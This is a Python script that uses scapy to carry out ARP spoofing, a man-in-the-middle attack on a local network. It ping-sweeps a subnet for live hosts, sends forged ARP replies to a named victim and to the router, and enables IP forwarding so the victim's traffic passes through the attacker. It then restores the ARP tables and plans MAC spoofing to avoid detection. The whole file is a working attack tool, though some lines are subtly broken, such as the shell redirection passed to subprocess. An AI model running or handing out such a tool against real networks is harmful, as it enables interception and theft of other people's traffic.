import time
import scapy.all as scapy
import sys
import subprocess
import os
import optparse


""" Requires spoofing two targets: telling the router you're the victim
    and telling the victim that you're the router
    Also need to enable port forwarding to allow packets to be captured and
    then released to the victim
        - Linux command: echo 1> /proc/sys/net/ipv4/ip_forward"""

""" Future plans: 
        Include the MAC_changer program to change your MAC to a MAC that resembles
        the victim's original router maker """


class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[1;32;40m'
    RED = '\033[1;31;40m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    NORMAL = '\033[0;37;40m'


def active_addresses():
    subnet = input("Enter first three octets of a valid /24 subnet: ")
    print("Available live targets:\n")
    with open(os.devnull, "wb") as limbo:
        for n in range(1, 255):

            ip = subnet + ".{0}".format(n)
            result = subprocess.Popen(["ping", "-c", "1", "-n", "-W", "2", ip], stdout=limbo, stderr=limbo).wait()
            if result:
                print(f"{ip} : {Colors.RED}Inactive{Colors.NORMAL}")
            else:
                print(f"{ip} : {Colors.GREEN}ACTIVE{Colors.NORMAL}")


def get_arguments(bypass = True):    # parses arguments entered by the user
    parser = optparse.OptionParser()
    parser.add_option("-b", "--bypass", dest="bypass", help="Bypass subnet enumeration")
    parser.add_option("-a", "--address", dest="ip", help="Victim IP who's ARP table will be poisoned")
    parser.add_option("-r", "--router", dest="router", help="Router IP who's ARP table will be poisoned")
    parser.add_option("-t", "--time", dest="time", help="Number of minutes to spoof the target for")

    (options, arguments) = parser.parse_args()  # parses user input
    # if address is not set
    if not options.ip:
        # code to handle error
        parser.error("[-] Please specify a victim address. Use --help for more info")
    # if spoof time is not set
    elif not options.router:
        # code to handle error
        parser.error("[-] Please specify a router address, Use --help for more info")
    elif not options.time:
        # code to handle error
        parser.error("[-] Please specify the amount of time to spoof the target. Use --help for more info")
    elif not options.bypass:
        active_addresses()
    return options


def get_mac(ip):
    """ Function to send an ARP request to the broadcast IP and capture the answer
        The results are displayed in a table of IP-to-MAC mappings."""
    arp_request = scapy.ARP(pdst=ip)    # initial ARP request
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")    # sending ARP request to the default broadcast MAC
    arp_request_broadcast = broadcast/arp_request  # the combined parameters to make the ARP broadcast
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]    # The first element of the answered list

    return answered[0][1].hwsrc  # select the MAC address from the list


def spoof(target_ip, spoof_ip):
    """ Create the ARP packet """
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # op=2 sets the packet as an ARP response. psrc needs to be router's IP to spoof the request
    # scapy will automatically assign attacker MAC as the source MAC, so no need to specify

    scapy.send(packet, verbose=False)
    # removes verbosity to create custom message


def restore_target_table(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # source MAC address needs to be specified here, otherwise scapy will use attacker MAC as the source
    scapy.send(packet, count=4)
    # sends packet 4 times to ensure the target receives the restore packet


def router_id(router_mac):
    """ Identifies the router's vendor and assigns a similar spoofed MAC to the attacker """


def main():
    options = get_arguments()   # options and arguments are caught within this function
    target_ip = options.ip
    router_ip = options.router
    poison_time = int(options.time) * (60 / 2)
    for i in range(0, 10):
        try:
            try:
                while i <= poison_time:
                    subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])  # enable port forwarding on attacker machine
                    spoof(target_ip, router_ip)  # tell the victim I'm the router
                    for k in range(0, 10):
                        print(f"\r[+] Successfully sent {i + 1} spoofed packet to router.", end=".")
                        time.sleep(2)
                        sys.stdout.flush()
                    spoof(router_ip, target_ip)  # tell the router I'm the victim
                    for k in range(0, 10):
                        print(f"\r[+] Successfully sent {i + 1} spoofed packet to router.", end="\r")
                        time.sleep(2)
                        sys.stdout.flush()
                    i += 1
                print("ARP Poison session ended. Restoring target ARP table...")
                restore_target_table(target_ip, router_ip)
                restore_target_table(router_ip, target_ip)
                print("Target ARP table restored. Disabling port forwarding...")
                subprocess.call(["echo", "0", ">", "/proc/sys/net/ipv4/ip_forward"])
            except KeyboardInterrupt:
                print("\n\n[-] CTRL + C detected")
                print("ARP Poison session ended. Restoring target ARP table...")
                restore_target_table(target_ip, router_ip)
                restore_target_table(router_ip, target_ip)
                print("Target ARP table restored. Disabling port forwarding...")
                subprocess.call(["echo", "0", ">", "/proc/sys/net/ipv4/ip_forward"])
        except IndexError:
            print(f"[-] {Colors.RED}Error{Colors.NORMAL}: {target_ip} is not active")


if __name__ == "__main__":
    main()
